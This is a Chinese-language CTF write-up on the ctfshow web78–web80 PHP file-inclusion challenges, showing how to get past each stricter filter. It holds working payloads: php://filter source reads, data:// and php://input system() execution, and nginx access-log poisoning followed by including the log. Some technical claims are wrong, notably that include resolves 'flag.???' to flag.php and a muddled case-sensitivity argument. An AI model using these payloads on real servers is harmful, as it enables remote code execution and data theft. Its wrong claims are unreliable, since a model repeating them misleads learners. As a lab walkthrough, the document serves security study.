---
title: 文件包含题解：web78～web80（过滤递进与绕过）
category: 文件包含/题解
tags: [ctfshow, web78, web79, web80, php://filter, data协议, 日志包含, str_replace, isset]
source: ctfshow web78
order: 4
---

## 一句话概括

ctfshow web78～web80 是一组**过滤逐级加码**的文件包含题：web78 完全不过滤 → `php://filter` 读源码；web79 过滤掉 `php` → 换 `data://`；web80 连 `data` 也过滤 → 改用**日志包含**。核心不是记 payload，而是**每加一层过滤就换一个不依赖被过滤关键词的入口**。

## 本题情景与解题手法

### 题目形态

三题给的都是同一段骨架：

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);          // web78：无过滤
}
?>
```

页面里直接提示 flag 在 `flag.php`。参数名是 `file`，值会被送进 `include()`。

### 第一步（web78）：先分清是「文件包含」还是「命令执行」

一开始会想传 `?file=cat /flag.php`，结果失败。原因是**参数值的性质完全不同**：

| 参数值 | PHP 如何理解它 | 结果 |
|---|---|---|
| `cat /flag.php` | 当作一个**普通文件名**（带空格的文件名） | 失败，找不到名为 `cat /flag.php` 的文件 |
| `/etc/passwd` | 当作**真实存在的文件路径** | 成功，内容被读出来 |
| `php://filter/...` | 当作 **PHP 伪协议**，按协议规则处理 | 成功，内容被过滤器处理 |

`?file=cat /flag.php` 这种写法只适用于 **`system($_GET['file'])` 之类的命令执行**漏洞；本题是 `include($_GET['file'])`，`include` 只认路径和协议，**不认 shell 命令**。

先验证包含链路通不通：

```http
GET /?file=/etc/passwd HTTP/1.1
Host: 靶机地址
```

能看到 `root:x:0:0:...` → 包含点可用。

但 `flag.php` 是**被 include 的 PHP 文件**，直接包含只会执行它（看不到源码）。所以要用 `php://filter` 让内容**先被编码成不可执行的文本**：

```http
GET /?file=php://filter/convert.base64-encode/resource=flag.php HTTP/1.1
Host: 靶机地址
```

返回一串 Base64，解码即得 `flag.php` 的内容。

> **为什么这个 payload 有效**：`php://filter` 先把 `flag.php` 的**原始字节**读出来，`convert.base64-encode` 把它们整体编码成纯 ASCII，再交给 `include`。这时 `include` 拿到的不是 `<?php ... ?>` 而是 `PD9waHA...` —— 不是有效 PHP 代码，于是被**原样输出**。这条链路与 `allow_url_include` 无关，永远可用。完整推导见 `00-基础\编码-为什么要Base64.md`。

### 第二步（web79）：`php` 被过滤，改用 `data://`

web79 在包含之前加了一行：

```php
$file = str_replace("php", "???", $file);
```

即**所有出现的 `"php"` 子串被替换成 `"???"`**。于是 `php://filter...` 被改写成 `???:filter...`，伪协议失效。

先明确一条关键性质（下面会反复用到）：**`str_replace` 只替换一次，不递归**；而且它按**子串**匹配，不区分「这个词是不是协议名」。

围绕这两点，有若干条路可走：

| 绕过思路 | Payload | 是否可行 |
|---|---|---|
| 大小写绕过 | `?file=PHP://filter/...` | 依赖环境：Windows 文件系统不区分大小写但**字符串比较区分**；Linux 上无效 |
| 换成 `file://` | `?file=file:///flag.php` | 协议名里不含 `php`，能过过滤，但会**直接执行**，看不到源码 |
| 双写绕过 | `?file=phpphp://filter/...` | **不可行**：`phpphp` 里两处 `php` 都在原文中真实存在，会被一起替换成 `??????`（见「原理 1」） |
| **换用 `data://`** | `?file=data://text/plain,<?=system("tac f*");?>` | **本题正路**：`data` 里不含 `php`，直接执行代码读 flag |

正路是 `data://`——它把「读源码再解码」直接跳成了「执行命令」：

```http
GET /?file=data://text/plain,<?=system("tac f*");?> HTTP/1.1
Host: 靶机地址
```

页面返回 `f*` 匹配到的文件（flag），说明 `data://` 里的代码被 `include` 执行了。

> `data://` **需要 `allow_url_include=On`**。如果这一步失败，先怀疑这个开关；而 `php://filter` 是不受它限制的。

### 第三步（web79 追问）：`flag.php` 里的 `php` 也会被替换，还读得到吗

原笔记在这里追了一个很细的问题：「那后面那个 `flag.php` 的 `php` 不用管了吗？」

**答案是不用管。** 跟着替换过程走一遍：

```text
payload 原文： php://filter/convert.base64-encode/resource=flag.php
str_replace 后：???:filter/convert.base64-encode/resource=flag.???
```

第二个 `php`（在 `flag.php` 里）确实也被替换成了 `???`，但**这不会影响读取**，原因有两个层面：

1. **替换只发生在「参数值」这个字符串上，不发生在磁盘上**。文件系统里那个文件依然叫 `flag.php`；
2. `include()` 拿到的是 `...resource=flag.???` —— 它在**实际的文件系统里查找**匹配的文件，而真实文件就叫 `flag.php`，于是命中。

顺带得到一个通用技巧：**不确定 flag 文件后缀时，可以不带后缀 / 用占位后缀去试**：

```text
?file=flag
?file=flag.???
?file=flag.txt
?file=flag.bak
```

因为文件系统按**实际文件名**匹配，参数里写什么后缀只影响「能不能被过滤规则命中」，不决定最终打开哪个文件。

### 第四步（web80）：`data` 也被过滤，改用日志包含

web80 在 web79 的基础上再补一刀：

```php
$file = str_replace("php", "???", $file);
$file = str_replace("data", "???", $file);
```

- `php://filter` → 被 `php` 卡死；
- `data://` → 被 `data` 卡死；
- 双写 `datadata://` 也走不通（`datadata` 里两处 `data` 都会被替换成 `??????`，拼不回 `data://`）。

剩下的路是 **日志包含**：日志路径里既没有 `php` 也没有 `data`，过滤规则完全不拦。

**① 污染日志** —— 访问一个路径里带 PHP 代码的 URL：

```http
GET /<?=system("tac /flag");?> HTTP/1.1
Host: 靶机地址
```

访问日志里就会多出一行：

```text
"GET /<?=system("tac /flag");?> HTTP/1.1" 404 123
```

**② 包含日志**：

```http
GET /?file=/var/log/nginx/access.log HTTP/1.1
Host: 靶机地址
```

PHP 把日志当代码读，执行了里面的 `<?=system(...)?>`，命令输出回显在页面上。

> 日志包含的完整原理、路径清单与探测方法见 `日志投毒与无文件包含.md`。

### 关于 `isset()`：怎么确认「进没进包含分支」

这三题的入口都有 `if(isset($_GET['file']))` 这一层。`isset()` 是 PHP 用来**检测变量是否已声明且值不为 `null`** 的函数：

```php
bool isset(mixed $var [, mixed $... ])
```

- 变量存在且值不是 `null` → 返回 `true`；
- 变量不存在，或值为 `null` → 返回 `false`；
- 一次检查多个变量时，**全部**存在且不为 `null` 才返回 `true`。

```php
if(isset($username) && isset($password)){ ... }
```

含义是「两个变量都存在且不为 `null` 时才往下走」。对做题来说，它提供两个判断依据：

1. **参数来源**：`$username` / `$password` 这类局部变量通常来自 `$_GET` / `$_POST`（或经 `extract()` 展开），所以对应的 HTTP 参数名就是变量名 —— 例如 `?username=admin&password=123456`；
2. **进分支的条件**：只要**把参数传上去了**（值不是 `null`）就能进分支，`isset` 本身**不做任何内容校验**。所以 `?file=` 后面放 `php://filter` 还是 `/etc/passwd`，都不影响能不能进门。

> 特别注意：`isset` 判断的是「有没有传」，不是「传的东西合不合法」。**它永远不是安全过滤** —— 真要过滤，得用白名单或 `preg_match`。

### 注入手法一句话总结

> **web78**：`include` 只认路径/协议 → 用 `php://filter/convert.base64-encode/resource=flag.php` 让源码变成不可执行文本再回显；
> **web79**：`str_replace("php","???")` 打掉 `php://` → 换 `data://text/plain,<?=system("tac f*");?>` 直接执行；
> **web80**：`data` 也被打掉 → 先访问带 PHP 代码的 URL 污染 access.log，再 `?file=/var/log/nginx/access.log` 包含日志执行。

## 原理

### 1. `str_replace` 的行为：为什么双写在 web79 上行不通

`str_replace` 的语义是「**在原文里找出所有出现位置，逐个替换**」，它扫描的是**原始字符串**，替换产生的新字符不会被再扫一遍（不递归）。这一点决定了双写能不能奏效。

**先看 web79 的双写：**

```php
str_replace("php", "???", "phpphp://filter")
```

`phpphp` 里有两处 `php`（下标 0 和下标 3），它们**在原文里都真实存在**，所以两处都会被替换：

```text
phpphp://filter
^^^^^                    ← 第 1 处（下标 0）命中
   ^^^^^                 ← 第 2 处（下标 3）命中
??????://filter          ← 两处全被替换，方案失败
```

**结论：web79 里双写 `phpphp://` 绕不过去**（这也是为什么最终要走 `data://`）。因为把 `php` 换成 `???` 后，`???` 里再也拼不出 `php`，双写无从生效。

**再看删除型过滤为什么能绕：**

```php
$file = str_replace("../", "", $file);
```

输入 `....//`（原文里有 6 个字符）：

```text
原 文：  . . . . / /
              ^^^             ← 从下标 2 开始正好是 "../"，被删掉
剩余  ：  . . /               ← 剩下的字符重新拼成了 "../"
```

这才是经典的「过滤反而帮了攻击者」——**删掉一段字符后，剩下的字符刚好重新组成关键词**。

**判断口诀**：双写能否绕过，取决于「**过滤后的残留字符能不能重新拼出关键词**」。

| 过滤方式 | 双写输入 | 替换结果 | 能绕吗 |
|---|---|---|---|
| `php` → `???`（替换） | `phpphp` | `??????` | **不能**：`???` 拼不出 `php` |
| `data` → `???`（替换） | `datadata` | `??????` | **不能**：同理 |
| 删除 `../` | `....//` | `../` | **能**：删的是中间一段，两侧残渣重拼 |
| 删除 `../` | `..././` | `../` | **能**：同理 |

> 一句话：**替换型过滤（还换成别的字符）双写基本无效；删除型过滤（直接抹掉）才有机会靠重拼生效。**

### 2. 三种参数值在 PHP 眼里的区别

| 参数值 | 是否含 `://` | 走哪条路 | 结果 |
|---|---|---|---|
| `cat /flag.php` | 否 | 当成相对路径文件名 | 找不到文件 |
| `/etc/passwd` | 否 | 默认 `file://` 包装器 | 打开本地文件 |
| `php://filter/...` | 是 | `php://` 包装器 | 按过滤器规则处理字节流 |

**「有没有 `://`」是 PHP 决定「当普通路径」还是「当协议」的分水岭。** 理解这点就能明白：为什么 `cat /flag.php` 不行（它被当成了一个超长的文件名），而 `php://filter/...` 行（它是协议）。

## Payload 速查

| 题目 | 过滤条件 | Payload |
|---|---|---|
| web78 | 无 | `?file=php://filter/convert.base64-encode/resource=flag.php` |
| web78 | 无（直接执行） | `?file=php://input` + POST `<?=system("tac f*");?>` |
| web79 | `php` → `???` | `?file=data://text/plain,<?=system("tac f*");?>` |
| web79 | `php` → `???` | `?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZioiKTs/Pg==` |
| web79 | `php` → `???`（读源码） | `?file=file:///var/www/html/flag.php`（会执行，非读源码） |
| web80 | `php`、`data` 都被替换 | 先 `GET /<?=system("tac /flag");?> ` 污染日志，再 `?file=/var/log/nginx/access.log` |

## 踩坑与备注

- **别把 `include` 当 `system`**：`?file=cat /flag.php` 是最常见的第一个错误。`include` 拿到的整个字符串都是**路径**，空格和 `cat` 都只是文件名的一部分。
- **`str_replace` 双写不是万能**：如「原理 1」所述，**替换型**过滤（`php` → `???`）双写无效，**删除型**过滤（删 `../`）双写才可能有效。原笔记里列的「方法3：双写绕过」在 web79 这道题上实际不可用，这里做了纠正。
- **大小写绕过依赖环境**：原笔记也标注了「但这里可能是在 Linux 系统上，需要确认」—— Windows 的文件系统大小写不敏感，但 `str_replace` 的字符串匹配是**敏感**的，所以 `PHP://` 在 Windows 上可能生效；Linux 上 `PHP://` 不是合法包装器，无效。
- **web80 笔记里的 `unserialize` 片段属于另一个主题**：原始笔记文件 `web80isset() 函数的作用.md` 中混入了一段 `$user = unserialize($_COOKIE['user']); ... $user->checkVip(); ... $user->vipOneKeyGetFlag();` 的代码。那段是 **PHP 反序列化 / 代码审计**的形态，与文件包含无关，属于笔记串行，本文只保留了其中的 `isset()` 知识点（见「关于 `isset()`」小节），反序列化部分请对照 `10-PHP反序列化` 分区。
- **原笔记里的靶场域名属于一次性环境**，本文统一写作 `靶机地址`。
